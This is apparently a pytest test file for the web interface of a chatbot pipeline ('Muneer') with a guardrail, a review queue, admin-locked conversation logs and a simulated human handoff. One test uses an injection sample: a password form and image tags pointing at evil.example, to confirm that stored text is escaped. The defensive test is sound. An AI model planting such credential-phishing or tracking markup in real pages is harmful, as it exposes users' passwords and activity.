import gradio as gr

from app.ui import (
    DAI_LABEL,
    FEED_EMPTY,
    MUNEER_LABEL,
    OUTCOMES,
    build_ui,
    chat_messages,
    feed_markdown,
    review_rows,
    review_view,
    trace_markdown,
)
from pipeline.conversation import Message
from pipeline.guardrail import Label, Verdict
from pipeline.muneer import MuneerReply
from pipeline.pipeline import Conversation, Trace
from pipeline.placeholders import FilledReply
from pipeline.review_queue import FlaggedReply
from pipeline.simulated_dai import DaiReply


def test_chat_messages_label_who_is_speaking():
    rendered = chat_messages([
        Message("notice", "Welcome <b>friend</b>"),
        Message("visitor", "Who are you?"),
        Message("muneer", "I'm Muneer."),
        Message("dai", "I'm one of the da'is."),
    ])
    assert rendered[0] == {"role": "assistant", "content": '<div class="muneer-notice">Welcome &lt;b&gt;friend&lt;/b&gt;</div>'}
    assert rendered[1] == {"role": "user", "content": "Who are you?"}
    assert rendered[2]["content"] == f"**{MUNEER_LABEL}**\n\nI'm Muneer."
    assert rendered[3]["content"] == f"**Mohammad · {DAI_LABEL}**\n\nI'm one of the da'is."
    assert DAI_LABEL == "Da'i (simulated by AI)"
    assert chat_messages([Message("dai", "Hi")], dai_name="Yusuf")[0]["content"].startswith("**Yusuf · ")


def handed_off_trace():
    return Trace(
        visitor_message="Where is God?",
        outcome="handed_off",
        muneer=MuneerReply("God is present everywhere in His essence.", "muneer", 612, 20, 18, "stop", "mock-muneer/creed_error"),
        filled=FilledReply(
            raw="I'm Daee, developed by Example Labs. See [org_link] [newsletter_url]",
            text="I'm Muneer. See https://example.org",
            replacements=((", developed by Example Labs", "", 1), ("Daee", "Muneer", 2)),
            placeholders=(("org_link", 1),),
            missing=("newsletter_url",),
        ),
        verdict=Verdict(Label.WRONG_FROM_ISLAMIC_POINT_OF_VIEW, "Wrong about Allah.", "gpt-4.1", 4210, 1069, 152),
        dai=DaiReply("Assalamu alaikum.", "gpt-4.1", 5120, 1091, 123),
        review_id=7,
    )


def test_trace_shows_every_step():
    text = trace_markdown(handed_off_trace(), 4)
    assert text.startswith(f"### Message 4: {OUTCOMES['handed_off']}")
    for expected in [
        "> Where is God?",
        "**1. Muneer's raw reply** · 0.6 s · 20 → 18 tokens · `mock-muneer/creed_error`",
        "> God is present everywhere in His essence.",
        "- removed `, developed by Example Labs`",
        "- replaced `Daee` with `Muneer` ×2",
        "- filled `[org_link]`",
        "- ⚠️ `[newsletter_url]` has no value",
        "> I'm Muneer. See https://example.org",
        "**3. Guardrail** · gpt-4.1 · 4.2 s · 1,069 → 152 tokens",
        "Label: **Wrong from an Islamic point of view** (`wrong_from_islamic_point_of_view`)",
        "> Wrong about Allah.",
        "saved to the review queue as #7",
        "**4. Simulated da'i** · gpt-4.1 · 5.1 s",
        "The da'i replied once, so the demo ended and the conversation closed.",
    ]:
        assert expected in text, expected
    assert "Suggested correction" not in text


def test_trace_for_a_delivered_reply_and_an_error():
    delivered = Trace("hi", "delivered", filled=FilledReply("Hello", "Hello"),
                      verdict=Verdict(Label.OK, "Fine.", "gpt-4.1", 3000))
    text = trace_markdown(delivered, 1)
    assert "**2. Placeholder filling** · no changes" in text
    assert "never saw" not in text and "Suggested correction" not in text

    error = trace_markdown(Trace("hi", "error", error="Guardrail unavailable: timeout"), 2)
    assert "⚠️ Guardrail unavailable: timeout" in error


def test_trace_says_saved_only_when_the_reply_was_saved():
    unsaved = handed_off_trace()
    unsaved.review_id = None
    text = trace_markdown(unsaved, 1)
    assert "couldn't be saved to the review queue" in text and "It was saved" not in text
    text = trace_markdown(unsaved, 1, review_queue=False)  # the app has none
    assert "The visitor never saw this reply." in text and "review queue" not in text


def test_the_live_tab_lists_every_message_newest_first():
    conversation = Conversation(traces=[Trace("first", "delivered"), Trace("second", "handed_off")])
    feed = feed_markdown(conversation)
    assert feed.index("### Message 2") < feed.index("### Message 1")
    assert feed.count("\n---\n") == 1

    pending = feed_markdown(conversation, "third")  # while the pipeline works on it
    assert pending.startswith("### Message 3: in progress…") and "> third" in pending
    assert feed_markdown(Conversation()) == FEED_EMPTY and feed_markdown(None) == FEED_EMPTY


def test_review_rows():
    item = FlaggedReply(3, "2026-10-04T10:15:42+00:00", "c1", Label.TRANSFER_REQUESTED, "Asked for a person.",
                        "raw", "filled", "Can I talk to someone?", (), "gpt-4.1")
    assert review_rows([item]) == [
        ["3", "2026-10-04 10:15", "Transfer requested", "Can I talk to someone?", "filled", "Asked for a person."]
    ]


def test_review_view_when_the_queue_is_empty(tmp_path):
    from pipeline.review_queue import ReviewQueue

    summary, rows = review_view(ReviewQueue(tmp_path / "q.sqlite3"))
    assert summary.startswith("**No flagged replies yet.**") and rows == []


def test_review_view_lists_flagged_replies(tmp_path):
    from pipeline.review_queue import ReviewQueue

    queue = ReviewQueue(tmp_path / "q.sqlite3")
    verdict = Verdict(Label.STOP, "Asked to stop.", "gpt-4.1", 1000)
    for _ in range(3):
        queue.add(conversation_id="c1", verdict=verdict, filled=FilledReply("raw", "filled"),
                  conversation=[Message("visitor", "stop")])
    summary, rows = review_view(queue, limit=2)
    assert summary.startswith("**3 flagged replies**, showing the latest 2.")
    assert len(rows) == 2 and rows[0][2] == "Stop"


def test_review_view_shows_a_visitor_only_their_own_conversations(tmp_path):
    from pipeline.review_queue import ReviewQueue

    queue = ReviewQueue(tmp_path / "q.sqlite3")
    verdict = Verdict(Label.TRANSFER_REQUESTED, "Asked for a person.", "gpt-4.1", 1000)
    for cid, text in [("mine", "my question"), ("theirs", "someone else's question")]:
        queue.add(conversation_id=cid, verdict=verdict, filled=FilledReply("raw", "filled"),
                  conversation=[Message("visitor", text)])

    summary, rows = review_view(queue, conversation_ids=["mine"])
    assert summary.startswith("**1 flagged reply in your conversations**")
    assert [row[3] for row in rows] == ["my question"]

    summary, rows = review_view(queue, conversation_ids=[])
    assert summary.startswith("**No flagged replies in your conversations yet.**") and rows == []

    summary, rows = review_view(queue)  # unlocked: everything
    assert summary.startswith("**2 flagged replies**") and len(rows) == 2


def test_passcode_matches():
    from app.ui import passcode_matches

    assert passcode_matches("open sesame", "open sesame")
    assert passcode_matches("  open sesame ", "open sesame")
    assert not passcode_matches("wrong", "open sesame")
    assert not passcode_matches("", "open sesame")
    assert not passcode_matches("anything", None)  # no passcode set: nothing unlocks
    assert not passcode_matches("", "")


def test_review_view_never_raises():
    import sqlite3

    class Unreadable:
        def recent(self, *args, **kwargs):
            raise sqlite3.OperationalError("unable to open database file")

    summary, rows = review_view(Unreadable())
    assert summary.startswith("⚠️ The review queue couldn't be read (unable to open database file)") and rows == []
    assert review_view(None) == ("The review queue is switched off.", [])

    class FolderGone:
        def recent(self, *args, **kwargs):
            raise PermissionError("can't create the folder")

    assert review_view(FolderGone())[0].startswith("⚠️ The review queue couldn't be read")


def test_every_outcome_has_a_description():
    from typing import get_args

    from pipeline.pipeline import Outcome

    assert set(OUTCOMES) == set(get_args(Outcome))


def example_pipeline(tmp_path):
    from pathlib import Path

    from dotenv import dotenv_values

    from pipeline.pipeline import Pipeline

    env = dotenv_values(Path(__file__).resolve().parents[2] / ".env.example")
    return Pipeline.from_env({**env, "OPENAI_API_KEY": "sk-test", "DATABASE_PATH": str(tmp_path / "q.sqlite3")})


def test_the_app_builds(tmp_path):
    pipeline = example_pipeline(tmp_path)
    assert isinstance(build_ui(pipeline), gr.Blocks)
    assert isinstance(build_ui(pipeline, admin_passcode="open sesame"), gr.Blocks)


def test_a_new_conversation_drops_a_reply_still_on_its_way(tmp_path):
    config = build_ui(example_pipeline(tmp_path)).config
    new_chat = next(c["id"] for c in config["components"] if c["props"].get("value") == "New conversation")
    respond = next(d["id"] for d in config["dependencies"] if d["trigger_after"] is not None)  # after the visitor sends
    assert any(respond in d["cancels"] for d in config["dependencies"] if d["targets"] == [(new_chat, "click")])


# ---- the Conversations tab --------------------------------------------------------


def stored_conversation(tmp_path):
    from pipeline.conversation_log import ConversationLog

    log = ConversationLog(tmp_path / "muneer.sqlite3")
    conversation = Conversation(session_id="page-1", messages=[Message("notice", "Welcome")])
    trace = handed_off_trace()
    conversation.messages += [Message("visitor", "Where is God?"), Message("dai", "Assalamu alaikum.")]
    conversation.traces.append(trace)
    conversation.state, conversation.visitor_messages = "closed", 1
    log.record(conversation, trace, first_new=1)
    return log, conversation


def test_the_conversations_tab_shows_nothing_until_the_admin_passcode_is_entered(tmp_path):
    from app.ui import CONVERSATIONS_LOCKED, conversation_detail, conversations_view

    log, conversation = stored_conversation(tmp_path)
    assert conversations_view(log, unlocked=False) == (CONVERSATIONS_LOCKED, [], [])
    assert conversation_detail(log, conversation.id, unlocked=False) == ([], "")


def test_the_conversations_tab_lists_and_opens_stored_conversations(tmp_path):
    from app.ui import conversation_detail, conversations_view

    log, conversation = stored_conversation(tmp_path)
    summary, rows, choices = conversations_view(log, unlocked=True)
    assert summary.startswith("**1 conversation**, 3 messages and 1 visitor messages handled")
    assert rows == [[conversation.started_at[:16].replace("T", " "), conversation.id[:8], "Where is God?", "1",
                     "Closed", ""]]
    assert [value for _, value in choices] == [conversation.id]

    transcript, turns = conversation_detail(log, conversation.id, unlocked=True)
    assert [m["role"] for m in transcript] == ["assistant", "user", "assistant"]
    assert transcript[2]["content"].startswith("**Mohammad · ")
    assert turns.startswith(f"### Message 1: {OUTCOMES['handed_off']} · ")
    assert "> God is present everywhere in His essence." in turns and "saved to the review queue as #7" in turns


def test_the_conversations_tab_never_raises():
    import sqlite3

    from app.ui import conversation_detail, conversations_view

    class Unreadable:
        def recent(self, *args):
            raise sqlite3.OperationalError("unable to open database file")

        messages = recent

    summary, rows, choices = conversations_view(Unreadable(), unlocked=True)
    assert summary.startswith("⚠️ The conversations couldn't be read") and rows == choices == []
    assert conversation_detail(Unreadable(), "abc", unlocked=True)[1].startswith("⚠️ This conversation couldn't be read")
    assert conversations_view(None, unlocked=True)[0] == "The conversation log is switched off."


def test_an_empty_conversation_log(tmp_path):
    from app.ui import conversations_view
    from pipeline.conversation_log import ConversationLog

    summary, rows, choices = conversations_view(ConversationLog(tmp_path / "m.sqlite3"), unlocked=True)
    assert summary.startswith("**No conversations yet.**") and rows == choices == []


def test_visitors_are_told_their_conversation_is_stored():
    from app.ui import DEMO_NOTE

    assert "every conversation is stored, exactly as you type it" in DEMO_NOTE
    assert "aren't stored" not in DEMO_NOTE



def test_stored_text_is_shown_as_text():
    from app.ui import trace_markdown

    attack = '<form action="https://evil.example"><input type=password></form><img src="https://evil.example/x.gif"> ![t](https://evil.example/t.png)'
    rendered = chat_messages([Message("visitor", attack), Message("muneer", attack), Message("dai", attack)])
    for message in rendered:
        assert "<form" not in message["content"] and "<img" not in message["content"]
        assert "&lt;form" in message["content"] and "!\\[t]" in message["content"]
    text = trace_markdown(Trace(attack, "error", error=attack), 1)
    assert "<form" not in text and "<img" not in text and "![t]" not in text


def test_the_page_is_stored_as_a_one_way_hash():
    from types import SimpleNamespace

    from app.ui import page_id

    session = "a1b2c3d4e5"
    stored = page_id(SimpleNamespace(session_hash=session))
    assert len(stored) == 16 and session not in stored
    assert stored == page_id(SimpleNamespace(session_hash=session))  # the same page groups together
    assert page_id(None) is None


def test_the_admin_passcode_is_checked_at_startup():
    import pytest

    from app.__main__ import admin_passcode
    from pipeline.config import ConfigError

    assert admin_passcode({}) is None
    assert admin_passcode({"ADMIN_PASSCODE": "x" * 16}) == "x" * 16
    with pytest.raises(ConfigError, match="at least 16 characters"):
        admin_passcode({"ADMIN_PASSCODE": "short"})
    for old, new in [("REVIEW_QUEUE_PASSCODE", "ADMIN_PASSCODE"), ("REVIEW_QUEUE_PATH", "DATABASE_PATH")]:
        with pytest.raises(ConfigError, match=f"{old} is now called {new}"):
            admin_passcode({old: "something"})


def test_the_tabs_the_passcode_opens_are_marked_admin_view(tmp_path):
    labels = {c["props"].get("label") for c in build_ui(example_pipeline(tmp_path)).config["components"]}
    assert {"Chat", "Behind the scenes", "Review queue (Admin View)", "Conversations (Admin View)"} <= labels
    assert not {"Review queue", "Conversations"} & labels
